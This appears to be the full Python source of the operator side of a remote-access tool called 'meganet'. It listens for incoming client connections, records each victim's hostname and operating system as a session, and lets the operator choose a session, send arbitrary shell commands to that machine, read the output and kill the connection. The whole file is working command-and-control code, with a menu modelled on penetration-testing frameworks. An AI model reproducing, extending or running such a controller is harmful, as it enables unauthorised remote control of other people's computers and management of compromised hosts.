import struct
import socket
import threading
import sys
import time
import os

HOST = ''
PORT = 19952

threads = []
ClientOS_list = []

def lyssnaren():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            längd_bytes = conn.recv(4)
            längd = struct.unpack("!I", längd_bytes)[0]
            hostname = conn.recv(längd)
            real_hostname = hostname.decode("utf-8")
            client = conn, addr, real_hostname

            ClientOS_len_bytes = conn.recv(4)
            ClientOS_len = struct.unpack("!I", ClientOS_len_bytes)[0]
            ClientOS = conn.recv(ClientOS_len)
            real_ClientOS = ClientOS.decode("utf-8")
            ClientOS_list.append(real_ClientOS)

            threads.append(client)
            print(f"\n[*] New client connected: {client[1][0]}")
            print("\033[4mmn >\033[0m ", end="", flush=True)

start_lyssnare = threading.Thread(target=lyssnaren, daemon=True)
start_lyssnare.start()


def banner():
    print(r"""
._____.___ ._______._____  .______  .______  .____________._
:         |: .____/:_ ___\ :      \ :      \ : .____/\__ _:|
|   \  /  || : _/\ |   |___|   .   ||       || : _/\   |  :|
|   |\/   ||   /  \|   /  ||   :   ||   |   ||   /  \  |   |
|___| |   ||_.: __/|. __  ||___|   ||___|   ||_.: __/  |   |
      |___|   :/    :/ |. |    |___|    |___|   :/     |___|
                    :   :/                                  


+ -- --=[ meganet v0.8 [loading sessions] 

""")
banner()
time.sleep(1)

while True:
    while True:
        meny_kommando = input("\033[4mmn >\033[0m ")
        if meny_kommando == "list":
            print("")
            print(f'{'ID':<3}  {'IP':<16} {'HOSTNAME':<14} {'OS'}')
            print("")
            for i, client in enumerate(threads):
                print(f'{i:<4} {client[1][0]:<16} {client[2]:<14} {ClientOS_list[i]}')
            print("")

        elif meny_kommando.startswith("use"): 
            print("")
            x = meny_kommando.split()
            index = int(x[1])
            conn = threads[index][0]
            break

        elif meny_kommando == "exit":
            sys.exit()
        
        elif meny_kommando == "clear":
            os.system("cls")
            banner()

        elif meny_kommando == "help":
            print("\nMeganet command list\n====================\n")
            print(f'{'   help':<15} {'Show the help menu'}')
            print(f'{'   list':<15} {'Lists active sessions'}')
            print(f'{'   use':<15} {'Select a session by id'}')
            print(f'{'   exit':<15} {'Exit the server'}')
            print(f'{'   clear':<15} {'Clears the screen'}\n')
            print("\nSession command list\n====================\n")
            print(f'{'   exit':<15} {'Go back to the server menu'}')
            print(f'{'   kill':<15} {'Kill the session'}\n')


        else:
            print(f'\n[-] Unknown command: {meny_kommando} \n')
        
        
    while True:
        path_bytes = conn.recv(4)
        path_recv_len = struct.unpack("!I", path_bytes)[0]
        path = conn.recv(path_recv_len)
        real_path = path.decode("utf-8")


        kommando = input(f"{real_path}> ")
        if kommando == "exit":
            exit_kommando = "__exit__"
            exit_kommando_encoded = exit_kommando.encode("utf-8")
            packning = struct.pack("!I", len(exit_kommando))
            conn.send(packning)
            conn.send(exit_kommando_encoded)
            break

        if kommando == "kill":
            kill_kommando = "__kill__"
            kill_kommando_encoded = kill_kommando.encode("utf-8")
            packning = struct.pack("!I", len(kill_kommando))
            conn.send(packning)
            conn.send(kill_kommando_encoded)
            del threads[index]
            del ClientOS_list[index]
            break
            

        packning = struct.pack("!I", len(kommando))
        conn.send(packning)
        conn.send(kommando.encode("utf-8"))

        Längd_bytes = conn.recv(4)
        längd = struct.unpack("!I", Längd_bytes)[0]
        svar = conn.recv(längd)

        error_bytes = conn.recv(4)
        error = struct.unpack("!I", error_bytes)[0]
        error_svar = conn.recv(error)

        if svar:
            if ClientOS_list[index] == "Windows":
                print(svar.decode("cp850"))
            elif ClientOS_list[index] == "Linux":
                print(svar.decode("utf-8"))
            
        if error_svar:
            if ClientOS_list[index] == "Windows":
                print(error_svar.decode("cp850"))
            elif ClientOS_list[index] == "Linux":
                print(error_svar.decode("utf-8"))

            
